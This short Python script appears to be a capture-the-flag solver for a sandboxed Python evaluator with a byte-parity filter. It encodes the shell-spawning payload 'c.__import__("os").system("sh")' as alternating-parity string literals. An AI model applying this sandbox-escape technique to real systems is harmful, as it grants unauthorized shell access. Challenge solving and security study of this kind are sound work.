# odd = bytes(range(1, 128, 2))
# even = bytes(range(0, 128, 2))

# print(even)
# print(odd)

# f = lambda: None

# print(f, f.__globals__)

def gen_str(s):
    cur = ''

    for c in s:
        if c == '_':
            if len(cur) % 2 == 0:
                cur += '"_"'
            else:
                cur += "'_'"
        else:
            par = ord(c) % 2
            if par == 0:
                if len(cur) % 2 == par:
                    cur += ' '
                cur += f"'{c}'"
            else:
                if len(cur) % 2 == par:
                    cur += '\t'
                cur += f'"{c}"'
 
    return cur.encode()

# print(gen_str('__builtins__'))
print(gen_str('c.__import__("os").system("sh")'))